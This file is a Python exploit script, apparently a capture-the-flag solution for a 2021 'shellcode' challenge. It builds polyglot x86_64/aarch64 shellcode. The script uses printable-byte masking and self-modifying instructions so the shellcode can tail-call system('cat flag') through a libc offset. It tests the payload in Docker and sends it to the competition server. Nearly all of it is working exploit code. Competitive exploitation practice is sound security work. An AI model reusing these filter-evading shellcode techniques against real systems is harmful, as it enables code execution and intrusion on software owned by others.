#!/usr/bin/env python3
import struct
import uuid

from pwn import *
from subprocess import check_call, check_output


def mask_n(n):
    while True:
        x1x2x3 = bytes(random.randint(0x20, 0x7F) for _ in range(12))
        x1, x2, x3 = struct.unpack("<III", x1x2x3)
        x4 = ((x1 - x2 - x3) & 0xFFFFFFFF) ^ n
        if all(0x20 <= b <= 0x7F for b in struct.pack("<I", x4)):
            return x1, x2, x3, x4


def main():
    # test_x86_64 = True
    # libc_offset = -0x222000
    test_x86_64 = False
    libc_offset = -0x223000  # CTF{abc_easy_as_svc}
    system_offset = libc_offset + 0x55410
    # 48 8d 92 .. .. .. ff 	lea    libc_offset(%rdx),%rdx
    # ff e2                	jmpq   *%rdx
    i1i2 = b"\x8d\x92" + struct.pack("<I", system_offset & 0xFFFFFFFF) + b"\xff\xe2"
    i1, i2 = struct.unpack("<II", i1i2)
    x11, x12, x13, x14 = mask_n(i1)
    x21, x22, x23, x24 = mask_n(i2)

    with open("x86_64.S", "w") as fp:
        fp.write(
            fr"""
.globl _start
_start:                                  /* %rdx == _start - 0x77 */

/* REX.W + 2D id | sub RAX, imm32 */
.macro sub_rax x
.byte 0x48, 0x2d
.long \x
.endm

/* REX.W + 35 id | xor RAX, imm32 */
.macro xor_rax x
.byte 0x48, 0x35
.long \x
.endm

push %rdx                                /* %rcx = _payload - 0x60 */
pop %rax
xor_rax 0x55555555 ^ ((_payload - 0x60) - (_start - 0x77))
xor_rax 0x55555555
push %rax
pop %rcx

push %rdx                                /* %rdi = "cat flag" */
pop %rax
xor_rax 0x55555555 ^ 272
xor_rax 0x55555555
push %rax
pop %rdi

push $0x{x11:x}
pop %rax
sub_rax 0x{x12:x}
sub_rax 0x{x13:x}
xor %eax, 0x61(%rcx)

push $0x{x21:x}
pop %rax
sub_rax 0x{x22:x}
sub_rax 0x{x23:x}
xor %eax, 0x65(%rcx)

_payload:                                /* tail call system() */
.byte 0x48
.long 0x{x14:x}
.long 0x{x24:x}
"""
        )
    check_call(
        ["gcc", "-o", "x86_64.elf", "x86_64.S", "-nostartfiles", "-nodefaultlibs"]
    )
    check_call(["objdump", "-d", "x86_64.elf"])
    check_call(
        ["objcopy", "-O", "binary", "--only-section=.text", "x86_64.elf", "x86_64.bin"]
    )
    with open("x86_64.bin", "rb") as fp:
        x86_64 = fp.read()
    with open("aarch64.S", "w") as fp:
        fp.write(
            r"""
    .align 12
    .globl _start
    /* 0x00    dispatcher gadget */
_start:
    /* 0x04 */ ldrb w11, [x1], #0x72
    /* 0x08 */ ands w11, w11, w11, lsr #16
    /* 0x0c */ ands w11, w11, w11, lsr #16                 /* w11 = 0 */
    /* 0x10 */ adds w11, w11, #0xedd
    /* 0x14 */ adds w11, w11, #0xedd
    /* 0x18 */ adds w11, w11, #0xedf
    /* 0x1c */ subs w11, w11, #0xc19                       /* w11 = 0x2080 */
    /* 0x20 */ ldeorh w11, w12, [x1]
    /* 0x24 */ ldrb w0, [x1], #-105
    /* 0x28 */ ldrb w0, [x1], #101
    /* 0x2c */ adds w11, w11, #0xedd
    /* 0x30 */ adds w11, w11, #0xedd
    /* 0x34 */ adds w11, w11, #0xedd
    /* 0x38 */ adds w11, w11, #0xedd
    /* 0x3c */ adds w11, w11, #0xedd
    /* 0x40 */ adds w11, w11, #0xedd
    /* 0x44 */ adds w11, w11, #0xedd
    /* 0x48 */ adds w11, w11, #0xedd
    /* 0x4c */ adds w11, w11, #0xedd                       /* w11 = 0xa645 */
    /* 0x50 */ ldeorh w11, w12, [x1]
    /* 0x54 */ adds w11, w11, #0xedd
    /* 0x58 */ adds w11, w11, #0xedd
    /* 0x5c */ adds w11, w11, #0xedd
    /* 0x60 */ ldrb w0, [x1], #114
    /* 0x64 */ ldrb w0, [x1], #-110
    /* 0x68 */ b.eq . + 0xe6444                            /* end qemu tb */
    /* 0x6c */ /* add x0, x1, 272 - 0x72 */
               /* 20 78 02 91 */
               .byte 0x20, 0x78, 0x02 ^ 0x45, 0x91 ^ 0xa6
               /* b _start - 4 - 0x131688 */
               /* 42 3a fb 17 */
    /* 0x70 */ .byte 0x42, 0x3a, 0xfb ^ 0x80, 0x17 ^ 0x20
"""
        )
    check_call(
        [
            "aarch64-linux-gnu-gcc",
            "-o",
            "aarch64.elf",
            "aarch64.S",
            "-nostartfiles",
            "-nodefaultlibs",
            "-march=armv8.5-a",
        ]
    )
    check_call(["aarch64-linux-gnu-objdump", "-d", "aarch64.elf"])
    check_call(
        [
            "aarch64-linux-gnu-objcopy",
            "-O",
            "binary",
            "--only-section=.text",
            "aarch64.elf",
            "aarch64.bin",
        ]
    )
    with open("aarch64.bin", "rb") as fp:
        aarch64 = fp.read()
    shellcode = flat(
        {
            # shellcode dispatcher
            # x86_64: j . + 0x77
            # aarch64: nop
            0: b"\x75\x75\x5D\x50",
            4: aarch64,
            0x77: x86_64,
            272: b"cat flag",
        }
    )
    with open("shellcode.bin", "wb") as fp:
        fp.write(shellcode)
    flag = uuid.uuid4().hex.encode()
    with open("flag", "wb") as fp:
        fp.write(flag)
    if test_x86_64:
        with open("shellcode.bin", "rb") as fp:
            actual = check_output(
                [
                    "docker",
                    "run",
                    "-i",
                    "-v",
                    f"{os.getcwd()}:{os.getcwd()}",
                    "-w",
                    os.getcwd(),
                    "ubuntu:20.04",
                    "./chal-x86-64",
                ],
                stdin=fp,
            )
            assert actual == flag, actual
    with open("shellcode.bin", "rb") as fp:
        actual = check_output(
            [
                "docker",
                "run",
                "-i",
                "-v",
                f"{os.getcwd()}:{os.getcwd()}",
                "-w",
                os.getcwd(),
                "arm64v8/ubuntu:20.04",
                "./chal-aarch64",
            ],
            stdin=fp,
        )
        assert actual == flag, actual
    with remote("shellcode.2021.ctfcompetition.com", 1337) as tube:
        tube.sendlineafter("Payload:", shellcode)
        tube.interactive()


if __name__ == "__main__":
    main()
